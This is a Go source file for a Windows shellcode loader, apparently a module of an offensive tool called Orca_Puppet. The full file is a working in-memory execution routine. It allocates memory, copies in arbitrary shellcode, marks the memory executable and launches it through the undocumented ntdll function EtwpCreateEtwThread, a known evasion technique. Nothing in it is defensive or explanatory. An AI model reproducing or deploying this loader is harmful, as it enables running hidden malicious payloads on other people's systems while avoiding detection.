package loader

import (
	"Orca_Puppet/define/colorcode"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func EtwpCreateEtwThread(shellcode []byte, pid int) string {
	stdErr := ""
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	thread, _, errEtwThread := EtwpCreateEtwThread.Call(addr, uintptr(0))
	if errEtwThread != nil && errEtwThread.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling EtwpCreateEtwThread:\r\n%s", errEtwThread.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	return ""
}
